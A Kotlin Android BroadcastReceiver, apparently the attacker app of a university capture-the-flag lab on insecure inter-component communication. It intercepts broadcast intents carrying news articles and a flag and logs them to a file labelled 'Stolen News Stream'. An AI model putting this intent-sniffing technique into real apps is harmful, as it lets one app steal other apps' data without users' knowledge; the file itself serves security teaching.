package uk.ac.swansea.dascalu.dvmicc.call_logger.icc

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import java.io.OutputStreamWriter

class CallsBroadcastReceiver : BroadcastReceiver() {

    override fun onReceive(context: Context?, intent: Intent) {
        if (intent.extras != null) {
            val jsonArticles = intent.getStringExtra("articles")
            val newsStreamName: String? = intent.getStringExtra("news_stream_name")
            val flag: String? = intent.getStringExtra("flag")

            if (jsonArticles != null) {
                if(context != null) {
                    writeDataToFile(context, jsonArticles, flag, newsStreamName)
                }
            }
        }
    }

    private fun writeDataToFile(context: Context, data: String, flag: String?, newsStreamName: String?) {
        val fileOut = context.openFileOutput("data.txt", Context.MODE_APPEND)
        val writer = OutputStreamWriter(fileOut)

        if(flag != null) {
            writer.write("\n\nFlag: $flag\n\n")
        }

        writer.write("Stolen News Stream: $newsStreamName\n\n")
        writer.write("$data\n\n")

        writer.close()
    }
}